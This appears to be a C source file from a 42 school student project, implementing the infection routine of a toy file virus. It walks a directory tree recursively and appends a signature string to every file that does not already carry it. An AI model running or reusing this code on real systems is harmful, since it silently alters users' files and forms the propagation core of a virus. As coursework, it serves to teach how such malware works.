/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   infect.c                                           :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: mbatty <mbatty@student.42angouleme.fr>     +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2026/03/04 11:29:15 by mbatty            #+#    #+#             */
/*   Updated: 2026/03/04 11:48:19 by mbatty           ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "infect.h"

#include <fcntl.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>
#include <dirent.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <sys/stat.h>

char	*strjoin(char const *s1, char const *s2);

#define DIRENT_DIRECTORY 4

int	infect_file(const char *path)
{
	if (check_signature(path) == -1)
		return (-1);

	int	fd = open(path, O_WRONLY | O_APPEND);
	if (fd == -1)
		return (-1);

	write(fd, SIGNATURE_STR, sizeof(SIGNATURE_STR));

	close(fd);
	return (0);
}

int	infect_dir(const char *path)
{
	struct dirent	*dirent = NULL;
	DIR				*dir = opendir(path);
	if (!dir)
		return (-1);

	do
	{
		dirent = readdir(dir);
		if (dirent)
		{
			if (!strcmp(dirent->d_name, ".") || !strcmp(dirent->d_name, ".."))
				continue ;

			char	*path_next = strjoin(path, "/");
			char	*new_path = strjoin(path_next, dirent->d_name);
			free(path_next);

			if (dirent->d_type == DIRENT_DIRECTORY)
				infect_dir(new_path);
			else
				infect_file(new_path);

			free(new_path);
		}
	} while (dirent);
	closedir(dir);
	return (0);
}
